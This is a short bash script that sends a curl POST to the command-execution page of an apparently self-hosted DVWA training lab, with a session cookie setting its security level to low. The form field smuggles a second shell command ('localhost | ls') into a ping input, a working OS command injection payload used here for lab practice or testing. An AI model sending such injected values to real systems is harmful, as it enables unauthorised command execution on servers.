#!/bin/bash

curl \
    -X POST \
    -d 'ip=localhost+%7C+ls&Submit=Submit' \
    --user-agent "lisy-ci" \
    -v http://dvwa.rerand0m.ru/vulnerabilities/exec/ \
    -b'security=low;PHPSESSID=419h04sqpgrbl8br0gtcldunn5'
